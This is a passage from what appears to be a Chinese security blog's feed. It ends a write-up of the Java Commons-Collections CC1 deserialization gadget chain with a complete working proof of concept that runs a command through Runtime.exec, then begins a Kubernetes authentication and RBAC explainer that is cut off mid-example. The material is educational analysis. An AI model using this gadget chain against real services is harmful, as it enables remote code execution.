title="ConstantTransformer"></a>ConstantTransformer</h5><p>现在我们接着解决上面的第一个问题，就是需要将<code>setValue</code>中的代理替换成我们的<code>Runtime.class</code>，可以通过<code>ConstantTransformer</code>实现。前面讲到了<code>ConstantTransformer</code>的<code>transform</code>方法接收一个输入并返回一个常量，因此我们只需要传入<code>Runtime.class</code>即可</p><p><img src="/2021/10/27/Java-CC1链复现与分析/22.png" alt="22"></p><h4 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map.Entry.setValue()</span><br><span class="line">  TransformedMap.checkSetValue()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h4 id="最终poc"><a href="#最终poc" class="headerlink" title="最终poc"></a>最终poc</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc1Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">       HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">       map.put(<span class="string">"value"</span>,<span class="string">"aaa"</span>);</span><br><span class="line">       Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="keyword">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">       Class c = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">       Constructor annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">       annotationInvocationhdlConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       Object o = annotationInvocationhdlConstructor.newInstance(Target<span class="class">.<span class="keyword">class</span>,<span class="title">transformedMap</span>)</span>;</span><br><span class="line">       serialize(o);</span><br><span class="line">       unserialize(<span class="string">"ser.bin"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"ser.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String  Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul><li><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java</a></li><li><a href="http://diego.team/2021/02/04/java-cc1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://diego.team/2021/02/04/java-cc1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/</a></li><li><a href="https://paper.seebug.org/1242/" target="_blank" rel="noopener">https://paper.seebug.org/1242/</a></li><li><a href="https://www.buaq.net/go-75937.html" target="_blank" rel="noopener">https://www.buaq.net/go-75937.html</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzI0MjgyNDA5NQ==&amp;mid=2247483715&amp;idx=1&amp;sn=bda48a95891b8a4533fbe1535d1ac75b&amp;chksm=e97727b3de00aea5e21cfa1407e669da095fed826733265e0beb93107e434178b8329f6cfe32&amp;token=1359929470&amp;lang=zh_CN#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI0MjgyNDA5NQ==&amp;mid=2247483715&amp;idx=1&amp;sn=bda48a95891b8a4533fbe1535d1ac75b&amp;chksm=e97727b3de00aea5e21cfa1407e669da095fed826733265e0beb93107e434178b8329f6cfe32&amp;token=1359929470&amp;lang=zh_CN#rd</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Apache-Commons-Collections&quot;&gt;&lt;a href=&quot;#Apache-Commons-Collections&quot; class=&quot;headerlink&quot; title=&quot;Apache Commons Collections&quot;&gt;&lt;/a&gt;Apache C
      
    
    </summary>
    
    
      <category term="Java" scheme="elssm.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes安全</title>
    <link href="elssm.github.io/2021/10/25/Kubernetes%E5%AE%89%E5%85%A8/"/>
    <id>elssm.github.io/2021/10/25/Kubernetes安全/</id>
    <published>2021-10-25T07:17:36.000Z</published>
    <updated>2021-10-26T08:01:47.714Z</updated>
    
    <content type="html"><![CDATA[<h4 id="机制说明"><a href="#机制说明" class="headerlink" title="机制说明"></a>机制说明</h4><p>Kubernetes作为一个分布式集群的管理工具，保证集群的安全性是一个很重要的任务，<code>API Server</code>是集群内部各个组件通信的中介，也是外部控制的入口，因此Kubernetes的安全机制基本就是围绕保护<code>API Server</code>来设计的，在Kubernetes中，采用了认证(Authentication)、鉴权(Authorization)、准入控制(Admission Controll)三步来保证<code>API Server</code>的安全。</p><h4 id="Kubernetes-API访问控制"><a href="#Kubernetes-API访问控制" class="headerlink" title="Kubernetes API访问控制"></a>Kubernetes API访问控制</h4><p>用户使用<code>kubectl</code>、客户端库或构造REST请求来访问<code>Kubernetes API</code>。用户和<code>Kubernetes</code>服务账户都可以被鉴权访问API。当请求到达API时，会经历多个阶段，如下图所示</p><p><img src="/2021/10/25/Kubernetes安全/4.png" alt="4"></p><p>在典型的Kubernetes集群中，API服务器在442端口上提供服务，受TLS保护，API服务器出出示证书。该证书可以使用私有证书颁发机构（CA）签名，也可以基于链接到公认的CA的公钥基础架构签名。如果你的集群使用私有证书颁发机构，你需要在客户端的<code>~/.kube/config</code>文件中提供该证书的副本，以便你可以信任该链接并确认连接没有被拦截。</p><h4 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h4><p>在Kubernetes中，认证分为下面三种</p><ul><li>HTTP Token认证：通过一个Token来识别合法用户<ul><li>HTTP Token的认证是用一个很长的特殊编码方式的并且难以被模仿的字符串，即Token来表达客户的一种方式，Token是一个很长的很复杂的字符串，每一个Token对一个一个用户名存放在<code>API Server</code>能访问的文件中，当客户端发起API调用请求时，需要在<code>HTTP Header</code>里放入Token</li></ul></li><li>HTTP Base认证：通过用户名+密码的方式认证<ul><li>用户名+密码采用<code>Base64</code>算法进行编码后的字符串放在<code>HTTP Request</code>中的<code>Heather Authorization</code>域里发送给服务端，服务端收到后进行编码，获取用户名及密码。</li></ul></li><li>HTTPS证书认证：基于CA根证书签名的客户端身份认证方式。这种方式最为严格，对于上面的两种方式，相当于只做了服务端认证客户端，并没有做客户端对服务端的认证。</li></ul><h5 id="需要认证的节点"><a href="#需要认证的节点" class="headerlink" title="需要认证的节点"></a>需要认证的节点</h5><ul><li>Kubernetes组件对<code>API Server</code>的访问：<code>kubectl</code>、<code>Controller Manager</code>、<code>Scheduler</code>、<code>kubelet</code>、<code>kube-proxy</code></li><li>Kubernetes管理的Pod对容器的访问：Pod（dashboard也是以Pod形式运行）</li></ul><h5 id="安全性说明"><a href="#安全性说明" class="headerlink" title="安全性说明"></a>安全性说明</h5><ul><li><code>Controller Manager</code>、<code>Scheduler</code>与<code>API Server</code>在同一台机器，所以直接使用<code>API Server</code>的非安全端口访问,<code>--insecure-bind-address=127.0.0.1</code></li><li><code>kubectl</code>、<code>kubelet</code>、<code>kube-proxy</code>访问<code>API Server</code>都需要证书进行HTTPS双向认证</li></ul><h5 id="证书颁发"><a href="#证书颁发" class="headerlink" title="证书颁发"></a>证书颁发</h5><ul><li>手动签发：通过Kubernetes集群根CA进行签发HTTPS证书</li><li>自动签发：<code>kubelet</code>首次访问<code>API Server</code>时，使用Token做认证，通过后，<code>Controller Manager</code>会为<code>kubelet</code>生成一个证书，以后的访问都是用证书做认证。</li></ul><h5 id="kubeconfig"><a href="#kubeconfig" class="headerlink" title="kubeconfig"></a>kubeconfig</h5><p>kubeconfig文件包含集群参数(CA证书，<code>API Server</code>地址)，客户端参数(生成的证书和私钥)，集群的context信息(集群名称、用户名)。Kubernetes组件通过启动时指定不同的kubeconfig文件可以切换到不同的集群。</p><p>查看kubeconfig文件</p><p><img src="/2021/10/25/Kubernetes安全/1.png" alt="1"></p><h5 id="ServiceAccount"><a href="#ServiceAccount" class="headerlink" title="ServiceAccount"></a>ServiceAccount</h5><p>Pod中的容器访问<code>API Server</code>，因为Pod的创建、销毁是动态的，因此要为它手动生成证书就比较麻烦，Kubernetes使用了SA解决Pod访问<code>API Server</code>的认证问题。</p><h5 id="Secret与SA的关系"><a href="#Secret与SA的关系" class="headerlink" title="Secret与SA的关系"></a>Secret与SA的关系</h5><p>Kubernetes设计了一种资源对象叫做Secret，分为两类，一种是用于<code>ServiceAccount</code>的<code>server-account-token</code>，另一种是用于保存用户自定义保密信息的<code>Opaque</code>。<code>ServiceAccount</code>中包含三个部分。Token、ca.crt、namespace</p><ul><li>Token是使用<code>API Server</code>私钥签名的JWT，用于访问<code>API Server</code>时，Server端认证</li><li>ca.crt根证书，用于Client端验证<code>API Server</code>发送的证书</li><li>namespace标识这个<code>service-account-token</code>的作用域名空间</li></ul><p>查看<code>ServiceAccount</code></p><p>默认情况下，每个namespace都会有一个<code>ServiceAccount</code>，如果Pod在创建时没有指定<code>ServiceAccount</code>，就会使用Pod所属的namespace的<code>ServiceAccount</code>。默认的挂载目录是<code>/run/secrets/kubernetes.io/serviceaccount/</code></p><p>首先我们查看一下当前存在的命名空间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro .kube % kubectl get ns</span><br><span class="line">NAME              STATUS   AGE</span><br><span class="line">default           Active   18d</span><br><span class="line">kube-node-lease   Active   18d</span><br><span class="line">kube-public       Active   18d</span><br><span class="line">kube-system       Active   18d</span><br></pre></td></tr></table></figure><p>接着查看命名空间为<code>kube-system</code>下的pod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % kubectl get pod -n kube-system</span><br><span class="line">NAME                                     READY   STATUS    RESTARTS   AGE</span><br><span class="line">coredns-558bd4d5db-fpmvp                 1/1     Running   6          18d</span><br><span class="line">coredns-558bd4d5db-m8zcd                 1/1     Running   6          18d</span><br><span class="line">etcd-docker-desktop                      1/1     Running   6          18d</span><br><span class="line">kube-apiserver-docker-desktop            1/1     Running   7          18d</span><br><span class="line">kube-controller-manager-docker-desktop   1/1     Running   6          18d</span><br><span class="line">kube-proxy-zw8fj                         1/1     Running   6          18d</span><br><span class="line">kube-scheduler-docker-desktop            1/1     Running   52         18d</span><br><span class="line">storage-provisioner                      1/1     Running   56         18d</span><br><span class="line">vpnkit-controller                        1/1     Running   1034       18d</span><br></pre></td></tr></table></figure><p>之后进入名为<code>kube-proxy-zw8fj</code>的pod中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl exec -it kube-proxy-zw8fj -n kube-system -- /bin/sh</span><br></pre></td></tr></table></figure><p>进入到挂载目录并查看token的详细信息</p><p><img src="/2021/10/25/Kubernetes安全/2.png" alt="2"></p><h4 id="Authorization"><a href="#Authorization" class="headerlink" title="Authorization"></a>Authorization</h4><p>在认证过程中，只是通信双方确认了对方是可信的，并且可以相互通信，而鉴权是确定请求方有哪些资源的权限，<code>API Server</code>目前支持以下几种授权策略（通过<code>API Server</code>的启动参数<code>--authorization-mode</code>设置）</p><ul><li>AlwaysDeny：表示拒绝所有的请求，一般用于测试</li><li>AlwaysAllow：允许接收所有请求，如果集群不需要授权流程，则可以采用该策略</li><li>ABAC(Attribute-Based Access Control)：基于属性的访问控制，表示使用用户配置的授权规则对用户请求进行匹配和控制</li><li>Webhook：通过调用外部REST服务对用户进行授权</li><li>RBAC(ROle-Based Access Control)：基于角色的访问控制，现行默认规则</li></ul><h5 id="RBAC授权模式"><a href="#RBAC授权模式" class="headerlink" title="RBAC授权模式"></a>RBAC授权模式</h5><p>RBAC在Kubernetes1.5中引入，现行版本成为默认标准，相对其他访问控制方式，拥有以下优势</p><ul><li>对集群中的资源和非资源均拥有完整的覆盖</li><li>整个RBAC完全由几个API对象完成，同其他API对象一样，可以用<code>kubectl</code>或API进行操作</li><li>可以在运行时进行调整，无需重启<code>API Server</code></li></ul><p>RBAC的API资源对象说明</p><p>RBAC引入了4个新的顶级资源对象：<code>Role</code>、<code>ClusterRole</code>、<code>RoleBinding</code>、<code>ClusterRoleBinding</code>。四种对象类型均可以通过<code>kubectl</code>与API操作。部分关系如下图所示</p><p><img src="/2021/10/25/Kubernetes安全/3.png" alt="3"></p><p>需要注意的是Kubernetes并不会提供用户管理，对于User、Group、ServiceAccount指定的用户，Kubernetes组件(kubectl、kube-proxy)或是其他自定义的用户在向CA申请证书时，需要提供一个证书请求文件。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"CN"</span>:<span class="string">"admin"</span>,</span><br><span class="line">  <span class="attr">"hosts"</span>:[],</span><br><span class="line">  <span class="attr">"key"</span>:&#123;</span><br><span class="line">    <span class="attr">"algo"</span>:<span class="string">"rsa"</span>,</span><br><span class="line">    <span class="attr">"size"</span>:<span class="number">2048</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"names"</span>:[</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"C"</span>:<span class="string">"CN"</span>,</span><br><span class="line">      <span class="attr">"ST"</span>:<span class="string">"Hangzhou"</span>,</span><br><span class="line">      <span class="attr">"L"</span>:<span class="string">"XS"</span>,</span><br><span class="line">      <span class="attr">"O"</span>:<span class="string">"system:masters"</span>,</span><br><span class="line">      <span class="attr">"OU"</span>:<span class="string">"System"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>API Server</code>会把客户端证书的<code>CN</code>字段作为User，把<code>names.O</code>字段作为Group</p><p><code>kubelet</code>使用<code>TLS Bootstrapping</code>认证时，<code>API Server</code>可以使用<code>Bootstrap Tokens</code>或者<code>Token authentication file</code>验证token，无论哪一种，Kubernetes都会为token绑定一个默认的User和Group。Pod使用<code>ServiceAccount</code>认证时，<code>service-account-token</code>中的JWT会保存User信息，有了用户信息，再创建一对角色/角色绑定(集群角色/集群角色绑定)资源对象，就可以完成权限绑定了。</p><h5 id="Role-and-ClusterRole"><a href="#Role-and-ClusterRole" class="headerlink" title="Role and ClusterRole"></a>Role and ClusterRole</h5><p>在RBAC API中，Role表示一组规则权限，权限只会增加(累加权限)，不存在一个资源一开始就有很多权限而通过RBAC对其进行减少的操作，Role可以定义在一个namespace中，如果想要跨namespace则可以创建ClusterRole</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-reader</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> <span class="string">[""]</span></span><br><span class="line">  <span class="attr">resources:</span> <span class="string">["pods"]</span></span><br><span class="line">  <span class="attr">verbs:</span> <span class="string">["get","watch","list"]</span></span><br></pre></td></tr></table></figure><p>ClusterRole具有和Role相同的权限角色控制能力，不同的是，ClusterRole是集群级别的，可以用于</p><ul><li>集群级别的资源控制（例如node访问权限）</li><li>非资源型 endpoints（例如<code>/healthz</code>访问）</li><li>所有命名空间资源控制（例如pods）</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-reader</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> <span class="string">[""]</span></span><br><span class="line">  <span class="attr">resources:</span> <span class="string">["secrets"]</span></span><br><span class="line">  <span class="attr">verbs:</span> <span class="string">["get","watch","list"]</span></span><br></pre></td></tr></table></figure><h5 id="RoleBinding-and-ClusterRoleBinding"><a href="#RoleBinding-and-ClusterRoleBinding" class="headerlink" title="RoleBinding and ClusterRoleBinding"></a>RoleBinding and ClusterRoleBinding</h5><p>RoleBinding可以将角色中定义的权限授予用户或用户组，RoleBinding包含一组权限列表(subjects)，权限列表中包含有不同形式的待授予权限资源类型(users,groups,service accounts)，RoleBinding同样包含对被Bind的Role引用，RoleBinding适用于某个命名空间内授权，而ClusterRoleBinding适用于集群范围内的授权。</p><p>例如，要将default命名空间的<code>pod-reader</code> Role授予elssm用户，此后elssm用户在default命名空间将具有<code>pod-reader</code>的权限</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">read-pods</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">elssm</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-reader</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><p>RoleBinding同样可以引用ClusterRole来对当前namespace内用户、用户组或ServiceAccount进行授权，这种操作允许集群管理员在整个集群内定义一些通用的ClusterRole，然后在不同的namespace中使用RoleBinding来引用。</p><p>例如，以下RoleBinding引用了一个ClusterRole，这个ClusterRole具有整个集群内对secrets的访问权限，但是其授权用户<code>warry</code>只能访问development空间中的secrets（因为RoleBinding定义在development命名空间）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">read-secrets</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">development</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">warry</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-reader</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><p>除此以外，还可以使用ClusterRoleBinding对整个集群中的所有命名空间资源权限进行授权，以下ClusterRoleBinding例子展示了授权manager组内所有用户在全部命名空间中对secrets进行访问</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">read-secrets-global</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">Group</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">manager</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-reader</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><h4 id="Admission-Controll"><a href="#Admission-Controll" class="headerlink" title="Admission Controll"></a>Admission Controll</h4><p>准入控制是<code>API Server</code>的插件集合，通过添加不同的插件，实现额外的准入控制规则，甚至于<code>API Server</code>的一些主要的功能都需要通过<code>Admission Controllers</code>，比如ServiceAccount</p><p>一些插件的功能</p><ul><li>Namespace Lifecycle：防止在不存在的namespace上创建对象，防止删除系统预置的namespace</li><li>LimitRanger：确保请求的资源不会超过所在namespace的LimitRange的限制</li><li>Service Account：实现了自动化添加ServiceAccount</li><li>ResourceQuota：确保请求的资源不会超过资源的ResourceQuota限制</li></ul><h4 id="配置节点的安全上下文"><a href="#配置节点的安全上下文" class="headerlink" title="配置节点的安全上下文"></a>配置节点的安全上下文</h4><p>我们可以在Pod或其所属容器的描述中通过security-Context选项配置其他与安全性相关的特性，这个选项可以适用于整个pod，或者每个pod中单独的容器。</p><p>配置安全上下文可以使我们完成很多事情，例如</p><ul><li>指定容器中运行进程的用户(用户ID)</li><li>阻止容器使用root用户运行</li><li>使用特权模式运行容器，使其对宿主节点的内核具有完全的访问权限</li><li>通过添加或禁用内核功能，配置细粒度的内核访问权限</li><li>设置SELinux(安全增强型Linux)选项，加强对容器的限制</li><li>阻止进程写入容器的根文件系统</li></ul><h5 id="运行没有配置安全上下文的pod"><a href="#运行没有配置安全上下文的pod" class="headerlink" title="运行没有配置安全上下文的pod"></a>运行没有配置安全上下文的pod</h5><p>创建一个名为<code>pod-with-defaults</code>的YAML文件，内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-with-defaults</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span 